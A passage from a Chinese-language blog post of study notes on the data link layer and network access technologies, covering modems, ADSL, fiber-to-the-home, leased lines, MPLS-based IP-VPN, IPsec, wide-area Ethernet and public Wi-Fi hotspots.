功放等设备与电视机、投影仪的连接,现在也逐渐开始用于计算机或平板电脑、数码相机与显示器的连接。从2009年发布的1.4 版开始它可以传输以太网帧,使得采用 HDMI介质实现 TCP/IP通信变为可能。\n公共网络 模拟电话线路 模拟电话线路其实就是利用固定电话线路进行通信。电话线中的音频带宽用于拔号上网。该方法不需要特殊的通信线路,完全使用已普及的电话网。 让计算机与电话线相连需要有一个将数字信号转换为模拟信号的调制解调器(俗称“猫”)。“猫”的传输速率一般只在56kbps 左右,所以现在已逐渐被淘汰。 （时代的眼泪）\nADSL ADSL’是对已有的模拟电话线路进行扩展的一种服务。模拟电话线路虽然也能传输高频数字通信,但是它与电信局的交换机之间只有发送音频信号时才能显示极好的传输效率,并会对其他多余频率的信号进行丢弃。\nADSL 正是利用话机到电信局交换机之间这段线路,附加一个叫做分离器的装置,将音频信号(低频信号)和数字信号(高频信号)隔离以免产生噪声干扰。\nFTTH FTTH(Fiber To The Home)顾名思义就是一根高速光纤直接连到用户家里或公司建筑物处的方法。它通过一个叫做ONU\u0026rsquo;的装置将计算机与之关连。该装置负责在光信号与电子信号之间的转换。使用FITH可以实现稳定的高速通信。不过它的线路传输速率与具体的服务内容仍受个别运营商限制。\n以上属于光纤到户。还有一种方式叫光纤到楼。它是指一个高速光纤直接连到某个大厦、公司或宾馆的大楼,随后在整个大楼内部再通过布线实现联网。简称FTTB(Fiber To The Building)。甚至还有一种方式是将光纤接人到某个家庭以后,再通过布线实现周围几户住家共同联网。这种方式简称为 FTIC (Fiber To The Curb\u0026rsquo;)。 有线电视 专线 随着互联网用户的急剧上升,专线服务向着价格更低、带宽更广以及多样化的方向发展。现在市面上已经出现了各种各样的“专线服务”。以NTT Group 的服务为例,有 Mega Data Nets(用 ATM 接口提供3Mbps~42Mbps 的专线接人)、ATM Mega-Link、Giga Stream(用以太网或 SONET/SDH 接口提供 0.5Mbps~135Mbps 的专线接人)等众多专线接入服务。\n专线的连接一定是一对一的连接。虽然 [[#ATM]] 的设计初衷允许有多个目标地, 但对于提供专线服务的ATMMega-Link中也只能指定一个目的地。因此不可能像ISDN 或帧中继那样引进一条线缆就能连接众多目的地。\nVPN 虚拟专用网络(VPN)用于连接距离较远的地域。这种服务包括 IP-VPN 和广域以太网。\nIP-VPN 意指在IP 网络(互联网)上建立 VPN。 网络服务商提供一种在 IP 网络上使用 MPIS 技术构建 VPN 的服务。其中MPLS(Multiprotocol Label Switching,多协议标签交换)在IP 包中附加一个叫做标签(Label\u0026rsquo;)的信息进行传输控制。每个用户的标签信息不同,因此在通过MPIS 网时,可以轻松地判断出目标地址。这样一来就可以将多个不同用户的VPN信息通过 MPLS 网加以区分,形成封闭的私有网络。此外,还能进行用户级的带宽控制。\nIPsec 除了使用服务提供商的 IP-VPN服务之外,有时企业还可以在互联网上建立自己的VPN\u0026rsquo;,一般采用的是 IPsec’技术。该方法对 VPN通信中的IP 包进行验证和加密,在互联网上构造一个封闭的私有网络。\n广域以太网 服务提供商所提供的用于连接相距较远的地域的一种服务。IP-VPN 是在IP 层面的连接,广域以太网则是在作为数据链路层的以太网上利用VLAN(虚拟局域网)实现 VPN的技术。该技术还可以使用 TCP/IP 中的其他协议。 广域以太网以企业专门使用服务提供商构建的 VLAN 网络为主要形式。只要指定同一个 VLAN,无论从哪里都能接入到同一个网络。\n公共无线 LAN 公共无线LAN 是指公开的可以使用[Wi-Fi]的服务。服务提供者可以在车站或餐饮店等人员相对比较集中的地方架设的一个叫做热点(HotSpot)的无线电波接收器。使用者到达这些区域就可以使用带有无线LAN网卡的笔记本电脑或智能手机连接上网。\n上网时使用者首先要通过这些热点建立互联网连接。连接以后,还可以通过那些利用 IPsec技术实现的VPN 连接到自己公司的内网。这种接人服务有时免费(如商场、车站等场所),有时也可能是收费的。 ","date":"2023-10-18T18:52:01+08:00","permalink":"https://anonymity-0.github.io/posts/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/","title":"数据链路层"}]